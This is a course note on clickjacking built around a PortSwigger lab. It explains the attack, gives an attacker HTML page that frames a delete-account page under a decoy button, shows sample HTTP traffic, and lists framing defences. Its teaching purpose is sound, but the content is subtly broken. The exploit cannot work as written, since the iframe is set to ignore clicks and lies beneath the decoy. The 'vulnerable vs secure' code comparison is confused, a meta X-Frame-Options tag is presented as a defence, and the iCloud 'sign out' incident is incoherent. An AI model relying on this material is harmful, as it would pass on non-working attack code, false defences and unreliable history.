---
course: Web Security
topic: Clickjacking
tags: [web-security]
---

## Introduction to Clickjacking

Clickjacking, also known as UI Redress Attack, is a malicious technique used by attackers to trick users into clicking on hidden buttons or links on a webpage. This attack exploits the way browsers handle overlapping elements and frames. The attacker creates a seemingly benign webpage that overlays a transparent or opaque layer over the actual interactive elements of a legitimate website. When a user clicks on the decoy elements, they inadvertently interact with the underlying elements, often performing actions they did not intend to.

### Why Clickjacking Matters

Clickjacking attacks can lead to serious consequences, such as unauthorized account deletion, financial transactions, or data theft. These attacks are particularly dangerous because they can bypass many traditional security measures like HTTPS encryption and CSRF tokens. By tricking the user into performing actions on behalf of the attacker, clickjackers can circumvent security mechanisms designed to protect against automated attacks.

### How Clickjacking Works Under the Hood

To understand clickjacking, it's essential to grasp how web pages are rendered and how browsers handle overlapping elements. Browsers render web pages in layers, and these layers can be manipulated using CSS properties like `position`, `z-index`, and `opacity`. An attacker can create a webpage with a transparent iframe that overlays the target website's interactive elements. When a user clicks on the decoy elements, the click event is passed through to the underlying iframe, triggering the unintended action.

#### Example of Clickjacking

Consider a scenario where a user visits a malicious website that contains a transparent iframe overlaying the "delete account" button on a legitimate banking website. When the user clicks on what they think is a harmless link on the malicious site, they actually trigger the "delete account" action on the banking site.

### Real-World Examples of Clickjacking

One notable real-world example of a clickjacking attack occurred in 2010 when Facebook users were tricked into liking a fake page. The attackers created a malicious webpage that overlaid a "like" button on a legitimate Facebook page. When users clicked on the decoy button, they inadvertently liked the fake page.

Another example is the clickjacking attack on Apple's iCloud service in 2016. Attackers created a webpage that overlaid a "sign out" button on the iCloud login page. Users who clicked on the decoy button were logged out of their iCloud accounts, giving the attackers temporary access to their accounts.

### Prerequisites for Clickjacking

To perform a clickjacking attack, several conditions must be met:

1. **Target Website Vulnerability**: The target website must be vulnerable to clickjacking. This typically means the website does not implement proper security measures to prevent framing.
2. **User Interaction**: The user must be tricked into interacting with the decoy elements on the attacker's website.
3. **Browser Support**: The attack relies on the browser's ability to render overlapping elements and pass click events through iframes.

### How to Detect Clickjacking

Detecting clickjacking attacks can be challenging, but there are several indicators to look out for:

1. **Unexpected Actions**: If a user performs an unexpected action on a website, such as deleting their account or making a financial transaction, it could be a sign of a clickjacking attack.
2. **Transparent Elements**: Inspecting the webpage for transparent or opaque elements that overlay interactive elements can help identify potential clickjacking attempts.
3. **Network Traffic Analysis**: Analyzing network traffic for unexpected requests or actions can provide clues about clickjacking attacks.

### How to Prevent Clickjacking

Preventing clickjacking requires implementing robust security measures on both the server and client sides. Here are some effective strategies:

1. **X-Frame-Options Header**: Set the `X-Frame-Options` header to `SAMEORIGIN` or `DENY` to prevent the website from being framed by other sites.
    ```http
    HTTP/1.1 200 OK
    Content-Type: text/html
    X-Frame-Options: SAMEORIGIN
    ```

2. **Content Security Policy (CSP)**: Implement a Content Security Policy (CSP) that restricts the sources from which content can be loaded.
    ```http
    HTTP/1.1 200 OK
    Content-Type: text/html
    Content-Security-Policy: frame-ancestors 'self'
    ```

3. **JavaScript Detection**: Use JavaScript to detect if the page is being framed and take appropriate action, such as redirecting the user or displaying a warning message.
    ```javascript
    if (top !== self) {
        top.location = self.location;
    }
    ```

### Lab Setup: Basic Clickjacking with CSRF Token Protection

In this lab, we will simulate a clickjacking attack on a website that uses CSRF tokens to protect against unauthorized actions. The goal is to trick the user into deleting their account by clicking on a decoy element on a malicious website.

#### Accessing the Lab

To access the lab, follow these steps:

1. Visit the URL `https://portswigger.net/web-security`.
2. Sign up for an account if you don't already have one.
3. Log in to your account.
4. Navigate to the Academy section.
5. Search for "clickjacking" and select the lab titled "Basic ClickJacking with CSRF token protection."

### Understanding the Lab Environment

The lab environment consists of a website with login functionality and a delete account button that is protected by a CSRF token. The attacker's goal is to craft an HTML page that frames the account page and tricks the user into clicking on the delete account button.

#### User Credentials

You are provided with user credentials to log into the account. The victim will be using Chrome, so ensure that your exploit works on this browser.

### Crafting the Exploit

To perform the clickjacking attack, we need to create an HTML page that frames the account page and overlays a decoy element. Here is a step-by-step guide to crafting the exploit:

1. **Create the Malicious HTML Page**:
    ```html
    <!DOCTYPE html>
    <html>
    <head>
        <title>Malicious Page</title>
        <style>
            iframe {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                opacity: 0;
                pointer-events: none;
            }
            .decoy {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background-color: red;
                color: white;
                padding: 10px;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <iframe src="https://target-website.com/account/delete"></iframe>
        <div class="decoy">Click Here</div>
    </body>
    </html>
    ```

2. **Explanation of the Code**:
    - The `iframe` tag is used to embed the target website's account page.
    - The `iframe` is styled to cover the entire page and made invisible using `opacity: 0` and `pointer-events: none`.
    - The `.decoy` div is positioned in the center of the page and styled to look like a clickable button.
    - When the user clicks on the `.decoy` div, the click event is passed through to the underlying `iframe`, triggering the delete account action.

3. **Testing the Exploit**:
    - Open the malicious HTML page in Chrome.
    - Ensure that the user is logged into the target website.
    - Click on the `.decoy` div to trigger the delete account action.

### Full HTTP Request and Response

Here is the full HTTP request and response for the delete account action:

```http
POST /account/delete HTTP/1.1
Host: target-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123; csrf_token=def456
Content-Length: 26

csrf_token=def456&action=delete
```

```http
HTTP/1.1 200 OK
Date: Mon, 01 Jan 2024 00:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html
Set-Cookie: session=; Expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; Path=/; HttpOnly
Set-Cookie: csrf_token=; Expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; Path=/; HttpOnly
Content-Length: 1024

<!DOCTYPE html>
<html>
<head>
    <title>Delete Account</title>
</head>
<body>
    <h1>Your account has been deleted.</h1>
</body>
</html>
```

### How to Prevent / Defend Against Clickjacking

#### Detection

To detect clickjacking attacks, monitor user actions and network traffic for unexpected behavior. Look for signs of unexpected actions, transparent elements, and unusual network requests.

#### Prevention

Implement the following security measures to prevent clickjacking attacks:

1. **X-Frame-Options Header**:
    ```http
    HTTP/1.1 200 OK
    Content-Type: text/html
    X-Frame-Options: SAMEORIGIN
    ```

2. **Content Security Policy (CSP)**:
    ```http
    HTTP/1.1 200 OK
    Content-Type: text/html
    Content-Security-Policy: frame-ancestors 'self'
    ```

3. **JavaScript Detection**:
    ```javascript
    if (top !== self) {
        top.location = self.location;
    }
    ```

#### Secure Coding Fixes

Compare the vulnerable and secure versions of the code:

**Vulnerable Version**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Page</title>
</head>
<body>
    <iframe src="https://target-website.com/account/delete"></iframe>
    <div class="decoy">Click Here</div>
</body>
</html>
```

**Secure Version**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Secure Page</title>
    <meta http-equiv="X-Frame-Options" content="SAMEORIGIN">
    <script>
        if (top !== self) {
            top.location = self.location;
        }
    </script>
</head>
<body>
    <div class="decoy">Click Here</div>
</body>
</html>
```

### Conclusion

Clickjacking is a sophisticated attack that can lead to serious consequences. By understanding how clickjacking works and implementing robust security measures, you can protect your website and users from these attacks. Always stay vigilant and keep your security practices up-to-date to defend against emerging threats.

### Practice Labs

For hands-on practice with clickjacking, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various web security topics, including clickjacking.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing different types of web attacks, including clickjacking.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application for learning and practicing web security techniques.

By engaging with these labs, you can gain practical experience and deepen your understanding of clickjacking and other web security concepts.

---
<!-- nav -->
[[02-Clickjacking Overview|Clickjacking Overview]] | [[Web Security (PortSwigger)/05-Clickjacking/02-Lab 1 Basic clickjacking with CSRF token protection/00-Overview|Overview]] | [[Web Security (PortSwigger)/05-Clickjacking/02-Lab 1 Basic clickjacking with CSRF token protection/04-Practice Questions & Answers|Practice Questions & Answers]]
